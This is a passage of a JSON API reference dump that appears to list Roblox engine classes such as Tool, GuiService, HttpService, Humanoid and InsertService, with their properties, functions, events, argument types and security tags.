},{"Arguments":[{"Name":"face","Type":"NormalId"},{"Name":"distance","Type":"float"}],"Name":"MouseDrag","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseEnter","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseLeave","tags":[],"Class":"Handles","type":"Event"},{"Superclass":"PartAdornment","type":"Class","Name":"SurfaceSelection","tags":[]},{"ValueType":"NormalId","type":"Property","Name":"TargetSurface","tags":[],"Class":"SurfaceSelection"},{"Superclass":"GuiBase3d","type":"Class","Name":"SelectionLasso","tags":[]},{"ValueType":"Object","type":"Property","Name":"Humanoid","tags":[],"Class":"SelectionLasso"},{"Superclass":"SelectionLasso","type":"Class","Name":"SelectionPartLasso","tags":["deprecated"]},{"ValueType":"Object","type":"Property","Name":"Part","tags":[],"Class":"SelectionPartLasso"},{"Superclass":"SelectionLasso","type":"Class","Name":"SelectionPointLasso","tags":["deprecated"]},{"ValueType":"Vector3","type":"Property","Name":"Point","tags":[],"Class":"SelectionPointLasso"},{"Superclass":"Instance","type":"Class","Name":"GuiItem","tags":[]},{"Superclass":"GuiItem","type":"Class","Name":"Backpack","tags":[]},{"Superclass":"GuiItem","type":"Class","Name":"BackpackItem","tags":[]},{"ValueType":"Content","type":"Property","Name":"TextureId","tags":[],"Class":"BackpackItem"},{"Superclass":"BackpackItem","type":"Class","Name":"HopperBin","tags":["deprecated"]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"HopperBin"},{"ValueType":"BinType","type":"Property","Name":"BinType","tags":[],"Class":"HopperBin"},{"ReturnType":"void","Arguments":[],"Name":"Disable","tags":["RobloxScriptSecurity"],"Class":"HopperBin","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ToggleSelect","tags":["RobloxScriptSecurity"],"Class":"HopperBin","type":"Function"},{"Arguments":[],"Name":"Deselected","tags":[],"Class":"HopperBin","type":"Event"},{"Arguments":[{"Name":"mouse","Type":"Instance"}],"Name":"Selected","tags":[],"Class":"HopperBin","type":"Event"},{"Superclass":"BackpackItem","type":"Class","Name":"Tool","tags":[]},{"ValueType":"bool","type":"Property","Name":"CanBeDropped","tags":[],"Class":"Tool"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Tool"},{"ValueType":"CoordinateFrame","type":"Property","Name":"Grip","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripForward","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripPos","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripRight","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripUp","tags":[],"Class":"Tool"},{"ValueType":"bool","type":"Property","Name":"ManualActivationOnly","tags":[],"Class":"Tool"},{"ValueType":"bool","type":"Property","Name":"RequiresHandle","tags":[],"Class":"Tool"},{"ValueType":"string","type":"Property","Name":"ToolTip","tags":[],"Class":"Tool"},{"ReturnType":"void","Arguments":[],"Name":"Activate","tags":[],"Class":"Tool","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Deactivate","tags":[],"Class":"Tool","type":"Function"},{"Arguments":[],"Name":"Activated","tags":[],"Class":"Tool","type":"Event"},{"Arguments":[],"Name":"Deactivated","tags":[],"Class":"Tool","type":"Event"},{"Arguments":[{"Name":"mouse","Type":"Instance"}],"Name":"Equipped","tags":[],"Class":"Tool","type":"Event"},{"Arguments":[],"Name":"Unequipped","tags":[],"Class":"Tool","type":"Event"},{"Superclass":"Tool","type":"Class","Name":"Flag","tags":["deprecated"]},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"Flag"},{"Superclass":"GuiItem","type":"Class","Name":"ButtonBindingWidget","tags":[]},{"Superclass":"GuiItem","type":"Class","Name":"GuiRoot","tags":["notCreatable"]},{"Superclass":"GuiItem","type":"Class","Name":"Hopper","tags":["deprecated"]},{"Superclass":"GuiItem","type":"Class","Name":"StarterPack","tags":[]},{"Superclass":"Instance","type":"Class","Name":"GuiService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AutoSelectGuiEnabled","tags":[],"Class":"GuiService"},{"ValueType":"Object","type":"Property","Name":"CoreEffectFolder","tags":["RobloxScriptSecurity","hidden"],"Class":"GuiService"},{"ValueType":"Object","type":"Property","Name":"CoreGuiFolder","tags":["RobloxScriptSecurity","hidden"],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"CoreGuiNavigationEnabled","tags":[],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"GuiNavigationEnabled","tags":[],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"IsModalDialog","tags":["deprecated","readonly"],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"IsWindows","tags":["deprecated","readonly"],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"MenuIsOpen","tags":["readonly"],"Class":"GuiService"},{"ValueType":"Object","type":"Property","Name":"SelectedCoreObject","tags":["RobloxScriptSecurity"],"Class":"GuiService"},{"ValueType":"Object","type":"Property","Name":"SelectedObject","tags":[],"Class":"GuiService"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"dialog","Default":null},{"Type":"CenterDialogType","Name":"centerDialogType","Default":null},{"Type":"Function","Name":"showFunction","Default":null},{"Type":"Function","Name":"hideFunction","Default":null}],"Name":"AddCenterDialog","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"AddKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"selectionName","Default":null},{"Type":"Instance","Name":"selectionParent","Default":null}],"Name":"AddSelectionParent","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"selectionName","Default":null},{"Type":"Tuple","Name":"selections","Default":null}],"Name":"AddSelectionTuple","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"SpecialKey","Name":"key","Default":null}],"Name":"AddSpecialKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"data","Default":null},{"Type":"int","Name":"notificationType","Default":null}],"Name":"BroadcastNotification","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"input","Default":null}],"Name":"CloseStatsBasedOnInputString","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetBrickCount","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"GetClosestDialogToPosition","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetErrorMessage","tags":["RobloxScriptSecurity","deprecated"],"Class":"GuiService","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"GetGuiInset","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"Dictionary","Arguments":[],"Name":"GetNotificationTypeList","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetResolutionScale","tags":["LocalUserSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetUiMessage","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsMemoryTrackerEnabled","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsTenFootInterface","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"OpenBrowserWindow","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"title","Default":null},{"Type":"string","Name":"url","Default":null}],"Name":"OpenNativeOverlay","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"dialog","Default":null}],"Name":"RemoveCenterDialog","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"RemoveKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"selectionName","Default":null}],"Name":"RemoveSelectionGroup","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"SpecialKey","Name":"key","Default":null}],"Name":"RemoveSpecialKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"x1","Default":null},{"Type":"int","Name":"y1","Default":null},{"Type":"int","Name":"x2","Default":null},{"Type":"int","Name":"y2","Default":null}],"Name":"SetGlobalGuiInset","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"open","Default":null}],"Name":"SetMenuIsOpen","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UiMessageType","Name":"msgType","Default":null},{"Type":"string","Name":"uiMessage","Default":null}],"Name":"SetUiMessage","tags":["LocalUserSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"input","Default":null}],"Name":"ShowStatsBasedOnInputString","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ToggleFullscreen","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"Vector2","Arguments":[],"Name":"GetScreenResolution","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"YieldFunction"},{"Arguments":[],"Name":"BrowserWindowClosed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"newErrorMessage","Type":"string"}],"Name":"ErrorMessageChanged","tags":["RobloxScriptSecurity","deprecated"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"},{"Name":"modifiers","Type":"string"}],"Name":"KeyPressed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"MenuClosed","tags":[],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"MenuOpened","tags":[],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"ShowLeaveConfirmation","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"key","Type":"SpecialKey"},{"Name":"modifiers","Type":"string"}],"Name":"SpecialKeyPressed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"msgType","Type":"UiMessageType"},{"Name":"newUiMessage","Type":"string"}],"Name":"UiMessageChanged","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"ReturnType":"void","Arguments":[{"Name":"title","Type":"string"},{"Name":"text","Type":"string"}],"Name":"SendCoreUiNotification","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"GuidRegistryService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"HapticService","tags":["notCreatable"]},{"ReturnType":"Tuple","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null},{"Type":"VibrationMotor","Name":"vibrationMotor","Default":null}],"Name":"GetMotor","tags":[],"Class":"HapticService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null},{"Type":"VibrationMotor","Name":"vibrationMotor","Default":null}],"Name":"IsMotorSupported","tags":[],"Class":"HapticService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null}],"Name":"IsVibrationSupported","tags":[],"Class":"HapticService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null},{"Type":"VibrationMotor","Name":"vibrationMotor","Default":null},{"Type":"Tuple","Name":"vibrationValues","Default":null}],"Name":"SetMotor","tags":[],"Class":"HapticService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"HttpRbxApiService","tags":["notCreatable"]},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"apiUrlPath","Default":null},{"Type":"ThrottlingPriority","Name":"priority","Default":"Default"},{"Type":"HttpRequestType","Name":"httpRequestType","Default":"Default"},{"Type":"bool","Name":"doNotAllowDiabolicalMode","Default":"false"}],"Name":"GetAsync","tags":["RobloxScriptSecurity"],"Class":"HttpRbxApiService","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"apiUrlPath","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"ThrottlingPriority","Name":"priority","Default":"Default"},{"Type":"HttpContentType","Name":"content_type","Default":"ApplicationJson"},{"Type":"HttpRequestType","Name":"httpRequestType","Default":"Default"},{"Type":"bool","Name":"doNotAllowDiabolicalMode","Default":"false"}],"Name":"PostAsync","tags":["RobloxScriptSecurity"],"Class":"HttpRbxApiService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"HttpService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"HttpEnabled","tags":["LocalUserSecurity"],"Class":"HttpService"},{"ReturnType":"string","Arguments":[{"Type":"bool","Name":"wrapInCurlyBraces","Default":"true"}],"Name":"GenerateGUID","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"input","Default":null}],"Name":"JSONDecode","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"Variant","Name":"input","Default":null}],"Name":"JSONEncode","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"input","Default":null}],"Name":"UrlEncode","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"bool","Name":"nocache","Default":"false"},{"Type":"Variant","Name":"headers","Default":null}],"Name":"GetAsync","tags":[],"Class":"HttpService","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"HttpContentType","Name":"content_type","Default":"ApplicationJson"},{"Type":"bool","Name":"compress","Default":"false"},{"Type":"Variant","Name":"headers","Default":null}],"Name":"PostAsync","tags":[],"Class":"HttpService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Humanoid","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoJumpEnabled","tags":[],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"AutoRotate","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"CameraOffset","tags":[],"Class":"Humanoid"},{"ValueType":"HumanoidDisplayDistanceType","type":"Property","Name":"DisplayDistanceType","tags":[],"Class":"Humanoid"},{"ValueType":"Material","type":"Property","Name":"FloorMaterial","tags":["readonly"],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"Health","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"HealthDisplayDistance","tags":[],"Class":"Humanoid"},{"ValueType":"HumanoidHealthDisplayType","type":"Property","Name":"HealthDisplayType","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"HipHeight","tags":[],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"Jump","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"JumpPower","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"LeftLeg","tags":["deprecated","hidden"],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"MaxHealth","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"MaxSlopeAngle","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"MoveDirection","tags":["readonly"],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"NameDisplayDistance","tags":[],"Class":"Humanoid"},{"ValueType":"NameOcclusion","type":"Property","Name":"NameOcclusion","tags":[],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"PlatformStand","tags":[],"Class":"Humanoid"},{"ValueType":"HumanoidRigType","type":"Property","Name":"RigType","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"RightLeg","tags":["deprecated","hidden"],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"RootPart","tags":["readonly"],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"SeatPart","tags":["readonly"],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"Sit","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"TargetPoint","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"Torso","tags":["deprecated","hidden"],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"WalkSpeed","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"WalkToPart","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"WalkToPoint","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"maxHealth","tags":["deprecated"],"Class":"Humanoid"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"accessory","Default":null}],"Name":"AddAccessory","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"status","Default":null}],"Name":"AddCustomStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Status","Name":"status","Default":"Poison"}],"Name":"AddStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"BuildRigFromAttachments","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"HumanoidStateType","Name":"state","Default":"None"}],"Name":"ChangeState","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"tool","Default":null}],"Name":"EquipTool","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetAccessories","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Limb","Arguments":[{"Type":"Instance","Name":"part","Default":null}],"Name":"GetLimb","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetPlayingAnimationTracks","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"HumanoidStateType","Arguments":[],"Name":"GetState","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"HumanoidStateType","Name":"state","Default":null}],"Name":"GetStateEnabled","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetStatuses","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"status","Default":null}],"Name":"HasCustomStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Status","Name":"status","Default":"Poison"}],"Name":"HasStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"moveDirection","Default":null},{"Type":"bool","Name":"relativeToCamera","Default":"false"}],"Name":"Move","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"location","Default":null},{"Type":"Instance","Name":"part","Default":"nil"}],"Name":"MoveTo","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RemoveAccessories","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"status","Default":null}],"Name":"RemoveCustomStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Status","Name":"status","Default":"Poison"}],"Name":"RemoveStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetClickToWalkEnabled","tags":["RobloxScriptSecurity"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"HumanoidStateType","Name":"state","Default":null},{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetStateEnabled","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"amount","Default":null}],"Name":"TakeDamage","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"UnequipTools","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"loadAnimation","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"amount","Default":null}],"Name":"takeDamage","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"Arguments":[{"Name":"animationTrack","Type":"Instance"}],"Name":"AnimationPlayed","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"speed","Type":"float"}],"Name":"Climbing","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"string"}],"Name":"CustomStatusAdded","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"string"}],"Name":"CustomStatusRemoved","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[],"Name":"Died","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"FallingDown","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"FreeFalling","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"GettingUp","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"health","Type":"float"}],"Name":"HealthChanged","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"Jumping","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"reached","Type":"bool"}],"Name":"MoveToFinished","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"PlatformStanding","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"Ragdoll","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"speed","Type":"float"}],"Name":"Running","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"},{"Name":"currentSeatPart","Type":"Instance"}],"Name":"Seated","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"old","Type":"HumanoidStateType"},{"Name":"new","Type":"HumanoidStateType"}],"Name":"StateChanged","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"state","Type":"HumanoidStateType"},{"Name":"isEnabled","Type":"bool"}],"Name":"StateEnabledChanged","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"Status"}],"Name":"StatusAdded","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"Status"}],"Name":"StatusRemoved","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"Strafing","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"speed","Type":"float"}],"Name":"Swimming","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"touchingPart","Type":"Instance"},{"Name":"humanoidPart","Type":"Instance"}],"Name":"Touched","tags":[],"Class":"Humanoid","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"InputObject","tags":["notCreatable"]},{"ValueType":"Vector3","type":"Property","Name":"Delta","tags":[],"Class":"InputObject"},{"ValueType":"KeyCode","type":"Property","Name":"KeyCode","tags":[],"Class":"InputObject"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"InputObject"},{"ValueType":"UserInputState","type":"Property","Name":"UserInputState","tags":[],"Class":"InputObject"},{"ValueType":"UserInputType","type":"Property","Name":"UserInputType","tags":[],"Class":"InputObject"},{"Superclass":"Instance","type":"Class","Name":"InsertService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AllowInsertFreeModels","tags":["deprecated","notbrowsable"],"Class":"InsertService"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"ApproveAssetId","tags":["deprecated"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetVersionId","Default":null}],"Name":"ApproveAssetVersionId","tags":["deprecated"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"instance","Default":null}],"Name":"Insert","tags":["deprecated"],"Class":"InsertService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetBaseCategories","tags":["deprecated"],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[],"Name":"GetBaseSets","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"categoryId","Default":null}],"Name":"GetCollection","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"string","Name":"searchText","Default":null},{"Type":"int","Name":"pageNum","Default":null}],"Name":"GetFreeDecals","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"string","Name":"searchText","Default":null},{"Type":"int","Name":"pageNum","Default":null}],"Name":"GetFreeModels","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"GetLatestAssetVersionAsync","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetUserCategories","tags":["deprecated"],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetUserSets","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"LoadAsset","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetVersionId","Default":null}],"Name":"LoadAssetVersion","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"loadAsset","tags":["deprecated"],"Class":"InsertService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"InstancePacketCache","tags":[]},{"Superclass":"Instance","type":"Class","Name":"IntConstrainedValue","tags":["deprecated"]},{"ValueType":"int","type":"Property","Name":"ConstrainedValue","tags":["hidden"],"Class":"IntConstrainedValue"},{"ValueType":"int","type":"Property","Name":"MaxValue","tags":[],"Class":"IntConstrainedValue"},{"ValueType":"int","type":"Property","Name":"MinValue","tags":[],"Class":"IntConstrainedValue"},{"ValueType":"int","type":"Property","Name":"Value","tags":[],"Class":"IntConstrainedValue"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"Changed","tags":[],"Class":"IntConstrainedValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"changed","tags":["deprecated"],"Class":"IntConstrainedValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"IntValue","tags":[]},{"ValueType":"int","type":"Property","Name":"Value","tags":[],"Class":"IntValue"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"Changed","tags":[],"Class":"IntValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"changed","tags":["deprecated"],"Class":"IntValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"JointInstance","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"C0","tags":[],"Class":"JointInstance"},{"ValueType":"CoordinateFrame","type":"Property","Name":"C1","tags":[],"Class":"JointInstance"},{"ValueType":"Object","type":"Property","Name":"Part0","tags":[],"Class":"JointInstance"},{"ValueType":"Object","type":"Property","Name":"Part1","tags":[],"Class":"JointInstance"},{"ValueType":"Object","type":"Property","Name":"part1","tags":["deprecated","hidden"],"Class":"JointInstance"},{"Superclass":"JointInstance","type":"Class","Name":"DynamicRotate","tags":[]},{"ValueType":"float","type":"Property","Name":"BaseAngle","tags":[],"Class":"DynamicRotate"},{"Superclass":"DynamicRotate","type":"Class","Name":"RotateP","tags":[]},{"Superclass":"DynamicRotate","type":"Class","Name":"RotateV","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Glue","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"F0","tags":[],"Class":"Glue"},{"ValueType":"Vector3","type":"Property","Name":"F1","tags":[],"Class":"Glue"},{"ValueType":"Vector3","type":"Property","Name":"F2","tags":[],"Class":"Glue"},{"ValueType":"Vector3","type":"Property","Name":"F3","tags":[],"Class":"Glue"},{"Superclass":"JointInstance"